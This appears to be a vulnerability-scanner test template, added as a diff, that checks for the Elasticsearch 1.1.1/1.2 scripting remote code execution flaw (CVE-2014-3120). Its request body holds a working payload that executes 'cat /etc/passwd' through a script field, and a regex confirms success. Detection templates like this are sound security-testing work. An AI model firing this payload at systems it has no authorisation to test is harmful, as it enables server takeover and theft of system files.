@@ -1,0 +1,67 @@
+id: ELASTICSEARCH_V1_RCE
+info:
+  name: "ElasticSearch v1.1.1/1.2 RCE"
+  description: "ElasticSearch v1.1.1 and v1.2 Remote Code Execution (RCE) vulnerabilities arise from flaws in these specific versions that allow attackers to execute arbitrary code on the server. These vulnerabilities typically stem from insecure handling of user inputs or misconfigured settings, particularly in dynamic scripting features. By exploiting these weaknesses, attackers can gain unauthorized access, manipulate data, or take control of the ElasticSearch environment. It is critical for users of these versions to upgrade to patched releases to mitigate the risks associated with these vulnerabilities." 
+  details: "ElasticSearch v1.1.1 and v1.2 RCE vulnerabilities are primarily caused by inadequate input validation and insecure configurations that allow dynamic scripting to execute arbitrary code. Attackers can exploit these vulnerabilities by sending specially crafted requests that trigger the execution of malicious scripts on the server. This can lead to unauthorized access to sensitive data, alteration or deletion of indexed content, and potentially complete control over the ElasticSearch environment. Users are strongly advised to upgrade to newer, secured versions to address these critical vulnerabilities and enhance overall security."
+  impact: "The impact of ElasticSearch v1.1.1 and v1.2 Remote Code Execution vulnerabilities can be severe, allowing attackers to execute arbitrary code on the server and potentially gain full control over the ElasticSearch instance. This can result in unauthorized access to sensitive data, manipulation or loss of indexed information, and the introduction of malware or backdoors. Furthermore, such exploits can compromise the availability and integrity of search services, leading to significant reputational damage, legal implications, and financial losses for affected organizations."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: ELASTICSEARCH_V1_RCE
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  cwe:
+    - CWE-78
+  cve:
+    - CVE-2014-3120
+
+api_selection_filters:
+  response_payload:
+    length:
+      gt: 0
+  method:
+    neq: "OPTIONS"
+  url:
+    extract: urlVar
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_method: POST
+        - replace_body: '{
+            "size": 1,
+            "query": {
+              "filtered": {
+                "query": {
+                  "match_all": {
+                  }
+                }
+              }
+            },
+            "script_fields": {
+                "command": {
+                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream()).useDelimiter(\"\\\\A\").next();"
+                }
+            }
+        }'
+        - modify_url: "_search?pretty"
+        - modify_header:
+            content-type: "application/x-www-form-urlencoded"
+
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    regex: "root:.*:0:0:"
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "application/json"
